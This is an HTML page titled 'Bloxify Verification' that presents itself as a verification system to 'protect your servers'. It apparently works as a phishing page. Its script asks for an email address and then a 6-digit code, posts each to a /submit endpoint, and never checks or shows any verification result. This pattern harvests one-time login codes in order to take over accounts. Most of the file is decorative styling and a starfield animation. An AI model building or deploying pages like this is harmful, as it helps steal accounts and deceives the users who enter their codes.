<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bloxify Verification</title>

<style>
:root {
    --bg-dark: #050505;
    --bg-mid: #0d0d0d;
    --glass: rgba(255,255,255,0.06);
}

* {
    box-sizing: border-box;
}

html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    background: black;
    font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
    overflow: hidden;
    color: white;
}

/* ===== DEEP SPACE FLOW ===== */
#space {
    position: fixed;
    inset: -60%;
    background:
        radial-gradient(circle at 20% 30%, #1a1a1a 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, #111 0%, transparent 45%),
        linear-gradient(120deg, #000, #080808, #000);
    animation: spaceDrift 40s ease-in-out infinite alternate;
    z-index: 0;
}

@keyframes spaceDrift {
    from { transform: translate(0,0) scale(1); }
    to   { transform: translate(-6%, -8%) scale(1.15); }
}

/* ===== STARS ===== */
.star {
    position: absolute;
    width: 5px;
    height: 5px;
    background: white;
    border-radius: 50%;
    box-shadow: 0 0 12px rgba(255,255,255,.9);
    opacity: .9;
    cursor: pointer;
    z-index: 1;
}

/* ===== CENTER LAYOUT ===== */
#center {
    position: fixed;
    inset: 0;
    display: grid;
    place-items: center;
    z-index: 5;
}

/* ===== GLASS UI ===== */
#ui {
    width: 420px;
    padding: 40px;
    border-radius: 20px;
    background:
        linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.02)),
        var(--bg-mid);
    backdrop-filter: blur(14px);
    box-shadow:
        0 40px 80px rgba(0,0,0,.7),
        inset 0 0 30px rgba(255,255,255,.04);
    text-align: center;
    animation: uiFloat 7s ease-in-out infinite;
}

@keyframes uiFloat {
    50% { transform: translateY(-10px); }
}

h1 {
    margin: 0;
    font-size: 34px;
    letter-spacing: .5px;
}

p {
    margin: 12px 0 28px;
    font-size: 14px;
    color: #aaa;
    line-height: 1.5;
}

/* ===== INPUTS ===== */
input {
    width: 100%;
    padding: 14px 16px;
    border-radius: 12px;
    border: none;
    background: #0c0c0c;
    color: white;
    font-size: 15px;
    outline: none;
    box-shadow: inset 0 0 0 1px rgba(255,255,255,.05);
}

button {
    margin-top: 16px;
    width: 100%;
    padding: 14px;
    border-radius: 12px;
    border: none;
    background: linear-gradient(180deg, #1c1c1c, #101010);
    color: white;
    font-size: 15px;
    cursor: pointer;
}

button:hover {
    background: linear-gradient(180deg, #222, #141414);
}

/* STEP FADE */
.step {
    animation: fade .4s ease;
}

@keyframes fade {
    from { opacity: 0; transform: translateY(6px); }
    to   { opacity: 1; transform: translateY(0); }
}
</style>
</head>

<body>

<div id="space"></div>

<div id="center">
    <div id="ui">
        <h1>Bloxify</h1>
        <p>Bloxify new-ish verification system ready to protect your servers.</p>

        <div id="emailStep" class="step">
            <input id="email" placeholder="Enter your email">
            <button onclick="sendEmail()">Continue</button>
        </div>

        <div id="codeStep" class="step" style="display:none;">
            <input id="code" placeholder="6-digit code"
                   maxlength="6"
                   inputmode="numeric"
                   oninput="this.value=this.value.replace(/[^0-9]/g,'')">
            <button onclick="sendCode()">Verify</button>
        </div>
    </div>
</div>

<script>
/* ===== STARS (SMOOTH FLOAT) ===== */
const stars = [];
const STAR_COUNT = 100;

for (let i = 0; i < STAR_COUNT; i++) {
    const s = document.createElement("div");
    s.className = "star";
    s.x = Math.random() * innerWidth;
    s.y = Math.random() * innerHeight;
    s.vx = (Math.random() - .5) * .15;
    s.vy = (Math.random() - .5) * .15;

    document.body.appendChild(s);
    stars.push(s);

    s.onclick = () => {
        s.animate([
            { transform: "translate(0,0)", opacity: 1 },
            { transform: `translate(${(Math.random()-0.5)*800}px, ${(Math.random()-0.5)*800}px)`, opacity: 0 }
        ], { duration: 700 });

        setTimeout(() => {
            s.x = Math.random()*innerWidth;
            s.y = Math.random()*innerHeight;
            s.style.opacity = 1;
        }, 700);
    };
}

function animateStars() {
    for (const s of stars) {
        s.x += s.vx;
        s.y += s.vy;

        if (s.x < 0) s.x = innerWidth;
        if (s.x > innerWidth) s.x = 0;
        if (s.y < 0) s.y = innerHeight;
        if (s.y > innerHeight) s.y = 0;

        s.style.left = s.x + "px";
        s.style.top = s.y + "px";
    }
    requestAnimationFrame(animateStars);
}
animateStars();

/* ===== SUBMIT ===== */
function sendEmail() {
    fetch("/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ email: email.value })
    });

    emailStep.style.display = "none";
    codeStep.style.display = "block";
}

function sendCode() {
    fetch("/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ code: code.value })
    });
}
</script>

</body>
</html>
